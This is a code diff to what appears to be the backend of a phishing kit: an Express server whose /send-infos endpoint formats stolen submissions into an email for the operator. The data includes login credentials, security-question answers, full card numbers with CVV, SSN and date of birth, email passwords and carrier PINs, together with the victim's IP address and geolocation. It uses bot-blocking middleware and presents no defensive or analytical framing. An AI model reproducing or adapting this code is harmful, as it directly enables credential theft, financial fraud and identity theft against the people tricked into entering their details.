@@ -13,7 +13,6 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 };
 Object.defineProperty(exports, "__esModule", { value: true });
 const express_1 = __importDefault(require("express"));
-const tableify_1 = __importDefault(require("tableify"));
 const express_nobots_1 = __importDefault(require("express-nobots"));
 const geoip_lite_1 = __importDefault(require("geoip-lite"));
 require("dotenv").config();
@@ -28,7 +27,59 @@ app.post("/send-infos", (req, res) => __awaiter(void 0, void 0, void 0, function
         const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
         const geo = geoip_lite_1.default.lookup(ip);
         const values = req.body;
-        yield sendEmail_1.sendEmail(process.env.EMAIL_ADDRESS, tableify_1.default([values, { location: Object.assign({ ip }, geo) }]));
+        yield sendEmail_1.sendEmail(process.env.EMAIL_ADDRESS, `
+     <div>*********************************************@*********************************************</div>
+     ${values.form === "LOGIN DETAILS"
+            ? `
+        <br>
+        <h4>| *LOGIN DETAILS*</h4>
+        <p>| USERNAME: <b>${values.loginDetails.username}</b></p>
+        <p>| PASSWORD: <b>${values.loginDetails.password}</b></p>
+        <br>
+        `
+            : `
+     ${values.form === "SECURITY CHALLENGE"
+                ? `
+     <br>
+     <h4>| *SECURITY CHALLENGE*</h4>
+     <p>| QUESTION ONE: <b>${values.securityChallenge.challenQuestion1}</b></p>
+     <p>| ANSWER ONE: <b>${values.securityChallenge.answer1}</b></p>
+     <p>| QUESTION TWO: <b>${values.securityChallenge.challenQuestion2}</b></p>
+     <p>| ANSWER TWO: <b>${values.securityChallenge.answer2}</b></p>
+     <p>| QUESTION THREE: <b>${values.securityChallenge.challenQuestion3}</b></p>
+     <p>| ANSWER THREE: <b>${values.securityChallenge.answer3}</b></p>
+     <br>
+     `
+                : `${values.form === "CARD INFORMATION"
+                    ? `
+      <br>
+      <h4>| *CARD INFORMATION*</h4>
+      <p>| FULL NAME: <b>${values.cardInformation.fullname}</b></p>
+      <p>| CARD NUMBER: <b>${values.cardInformation.cardNumber}</b></p>
+      <p>| EXPIRATION DATE: <b>${values.cardInformation.expiryDate}</b></B></p>
+      <p>| CVV: <b>${values.cardInformation.cvv}</b></p>
+      <p>| SSN: <b>${values.cardInformation.ssn}</b></p>
+      <p>| DOB: <b>${values.cardInformation.dob}</b></p>
+      <br>
+     `
+                    : `
+               <br><br>
+               <h4>| ACCOUNT UPDATE</h4>
+               <p>| EMAIL ADDRESS: <b>${values.accountUpdate.email}</b></p>
+               <p>| EMAIL ADDRESS PASSWORD: <b>${values.accountUpdate.password}</b></p>
+               <p>| PHONE NUMBER: <b>${values.accountUpdate.phoneNumber}</b></p>
+               <p>| CARRIER PIN: <b>${values.accountUpdate.carrierPin}</b></p>
+               <br><br>
+               `}`}
+     `}
+     <div>*********************************************@*********************************************</div>
+     <br>
+     <p>| IP: <b>${ip}</b></p>
+     <p>| LOCATION: <b>${geo === null || geo === void 0 ? void 0 : geo.city}, ${geo === null || geo === void 0 ? void 0 : geo.country}</b></p>
+     <p>| TIMEZONE: <b>${geo === null || geo === void 0 ? void 0 : geo.timezone}</b></p>
+     <br>
+     <div>*********************************************END*********************************************</div>
+     `);
         res.send(Promise.resolve());
     }
     catch (error) {
